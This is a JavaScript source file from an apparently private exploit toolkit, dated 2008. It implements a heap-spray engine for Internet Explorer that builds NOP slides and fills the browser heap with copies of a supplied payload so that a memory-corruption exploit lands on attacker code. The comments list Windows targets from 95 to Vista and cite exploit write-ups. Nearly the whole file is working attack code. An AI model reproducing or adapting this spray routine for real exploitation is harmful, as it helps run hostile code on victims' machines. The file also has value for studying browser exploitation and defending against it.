/* 
 * $Id: heapSpray.js,v 1.0 2008-12-25 08:55:53-02 nbrito Exp $ 
 *
 * Author: Nelson Brito <nbrito@sekure.org>
 *
 * Copyright© 2004-2009 Nelson Brito Research Center.
 * This file is part of Exploit Next Generation Private Tool.
 *
 * THIS IS UNPUBLISHED, CONFIDENTIAL, PROPRIETARY, AND PROTECTED SOURCE CODE BY
 * Nelson Brito Research Center.

   The Copyright notice above does not evidence any actual or intended *RELEASE
   PUBLICATION, AND/OR DISCLOSURE OF SUCH SOURCE CODE*.

   This code *MAY BE* provided as open source but IS NOT LICENSED under the GPL 
   or other common open source licenses.

   This computer software is protected by Brazil Copyright Laws:
   - Lei n.º 9.610, de 19.02.98 (Direitos Autorais);
   - Lei n.º 9.609, de 19.02.98 (Lei de Software);
   - Decreto n.º 2.553, de 16.04.1998.

  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES ARE
  DISCLAIMED. IN NO EVENT SHALL Nelson Brito BE LIABLE FOR ANY DIRECT, INDIRECT,
  INCIDENTAL, SPECIAL, EXEMPLARY OR CONSEQUENTIAL DAMAGES RESULTING FROM THE 
  USE OR MISUSE OF THIS SOFTWARE. */

/* Some module details to show when checking the modules. */
var hpspray_caller  = "HPSPRAY";
var hpspray_info    = "JavaScript Heap Memory Spray Engine";
var hpspray_version = "4.01.0001";

/* Function Name: Routine to build a HEAP Spray and install an assembly component.
 *
 * Description:   Builds a lot of NOOP Slides in HEAP, using Java Script in Microsoft Internet Explorer.

                  This function helps to land in and/or use as return address and is based on the excellent
                  "Internet Exploiter 3 v0.2 .ANI Stack Overflow PoC" by Berend-Jan Wever.

                  A really good explanation about this technique is at:
                  http://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf
			http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html
                  http://skypher.com/wiki/index.php?title=Www.edup.tudelft.nl/%7Ebjwever/details_msie_ani.html.php
                  http://www.milw0rm.com/exploits/1224

   Targets:       Windows 95, Windows 98, Windows ME, Windows NT, Windows 2000, Windows XP, Windows 2003, Windows VISTA. */
function heapSpray(){ }

heapSpray.Spray = function (heapCode, heapSize, heapOffset){

	this.Large = 0, this.Slack, this.Memory, this.Header, this.Fill, this.Block;

	/* HEAP blocks in Microsoft Internet Explorer have 36 DWORDs as header. */
	/* this.Header = 0x38; 56 DWORDs works better. */
	this.Header = 0x24;
	/* HEAP blocks in Microsoft Internet Explorer are 0x40000 DWORDs big. */
	this.Size   = 0x40000;

	this.Slack  = this.Header + heapCode.length;

	/* Adding a little "fancy" stuff. */
	progressUpdate();

	/* Creating a NOOP Slide that will fit exactly between the header and the assembly component in 
	   the HEAP blocks the code needs. */
	do{
		heapOffset += heapOffset;
	} while (heapOffset.length < this.Slack);

	this.Fill   = heapOffset.substring(0, this.Slack);	
	this.Block  = heapOffset.substring(0, (heapOffset.length - this.Slack));

	do {
		this.Block += (this.Block + this.Fill);
	} while ((this.Block.length + this.Slack) < this.Size);

	/* Filling MB of HEAP with copies of the NOOP Slide and the assembly components. Basicaly the
	   code creates HEAP blocks to spray enough memory to be sure enough it had got at NOOP Slide. */
	this.Memory = new Array();

	do {
		this.Memory[this.Large] += this.Block + heapCode;
		this.Large++;
	} while (this.Large < heapSize);
}